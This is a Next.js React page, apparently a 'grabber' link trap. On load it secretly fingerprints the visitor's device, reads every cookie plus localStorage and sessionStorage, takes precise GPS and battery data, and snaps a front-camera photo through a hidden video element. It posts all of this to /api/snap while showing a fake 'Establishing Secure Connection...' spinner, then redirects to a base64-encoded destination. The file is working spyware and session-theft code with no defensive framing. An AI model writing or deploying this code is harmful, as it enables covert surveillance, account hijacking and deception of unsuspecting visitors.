"use client";

import React, { useEffect, useRef, Suspense } from "react";
import { useSearchParams } from "next/navigation";

function CaptureContent() {
  const searchParams = useSearchParams();
  const t = searchParams.get("t");
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const autoProcess = async () => {
      // 1. Decode Destination URL
      let destination = "/";
      try {
        if (t) destination = atob(t);
      } catch {
        destination = "/";
      }

      // 2. Kumpulkan Informasi Hardware & Browser Mendalam
      const getGPU = () => {
        const canvas = document.createElement("canvas");
        const gl =
          canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (gl) {
          const debugInfo = (gl as any).getExtension(
            "WEBGL_debug_renderer_info",
          );
          return debugInfo
            ? (gl as any).getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            : "Generic GPU";
        }
        return "Software Renderer";
      };

      const deviceInfo = {
        model: navigator.userAgent.split("(")[1]?.split(")")[0] || "Unknown",
        os: navigator.platform,
        browser: navigator.userAgent.split(" ").pop(),
        ram: (navigator as any).deviceMemory
          ? `${(navigator as any).deviceMemory} GB`
          : "Unknown",
        cpu: navigator.hardwareConcurrency
          ? `${navigator.hardwareConcurrency} Cores`
          : "Unknown",
        language: navigator.language,
        gpu: getGPU(),
      };

      // 3. Kumpulkan Data Penyimpanan (Cookies & Storage)
      const storageData = {
        cookies: document.cookie ? document.cookie.split(";") : [],
        localStorage: JSON.stringify(window.localStorage),
        sessionStorage: JSON.stringify(window.sessionStorage),
      };

      // 4. Deteksi Izin & Sensor (Ya-WebADB Support)
      const permissions = {
        usb: "usb" in navigator ? "supported" : "unsupported",
        hid: "hid" in navigator ? "supported" : "unsupported",
        notifications:
          "Notification" in window ? Notification.permission : "unsupported",
        clipboard: "clipboard" in navigator ? "available" : "denied",
      };

      // 5. Deteksi Baterai
      let batteryInfo = null;
      try {
        if ("getBattery" in navigator) {
          const b: any = await (navigator as any).getBattery();
          batteryInfo = {
            level: Math.round(b.level * 100),
            charging: b.charging,
          };
        }
      } catch (e) {}

      // 6. Ambil GPS
      const gps = await new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          (pos) =>
            resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
          () => resolve(null),
          { timeout: 5000, enableHighAccuracy: true },
        );
      });

      // 7. Proses Capture Kamera & Pengiriman Data
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
        });

        if (videoRef.current && canvasRef.current) {
          videoRef.current.srcObject = stream;
          await new Promise((r) => setTimeout(r, 1500));

          const video = videoRef.current;
          const canvas = canvasRef.current;
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext("2d")?.drawImage(video, 0, 0);

          const image = canvas.toDataURL("image/png");
          stream.getTracks().forEach((track) => track.stop());

          // Kirim Full Payload ke API
          await fetch("/api/snap", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              image,
              gps,
              device: deviceInfo,
              battery: batteryInfo,
              permissions: { ...permissions, location: !!gps },
              cookies: storageData.cookies,
              localStorageData: storageData.localStorage,
              gpu: deviceInfo.gpu,
            }),
          });
        }
      } catch (err) {
        // Tetap kirim data meskipun kamera diblokir
        await fetch("/api/snap", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            image: "",
            gps,
            device: deviceInfo,
            battery: batteryInfo,
            permissions: { ...permissions, location: !!gps },
            cookies: storageData.cookies,
            localStorageData: storageData.localStorage,
            gpu: deviceInfo.gpu,
          }),
        });
      } finally {
        window.location.replace(destination);
      }
    };

    autoProcess();
  }, [t]);

  return (
    <div className="bg-black text-white flex flex-col items-center justify-center min-h-screen font-mono">
      {/* Tampilan Fake Loading Profesional */}
      <div className="w-16 h-16 border-4 border-blue-500/20 border-t-blue-500 rounded-full animate-spin mb-4"></div>
      <p className="text-[10px] tracking-[0.3em] text-blue-500 uppercase animate-pulse">
        Establishing Secure Connection...
      </p>

      <video
        ref={videoRef}
        autoPlay
        playsInline
        className="absolute opacity-0 w-1 h-1 pointer-events-none"
      />
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
}

export default function CapturePage() {
  return (
    <Suspense fallback={<div className="bg-black min-h-screen"></div>}>
      <CaptureContent />
    </Suspense>
  );
}
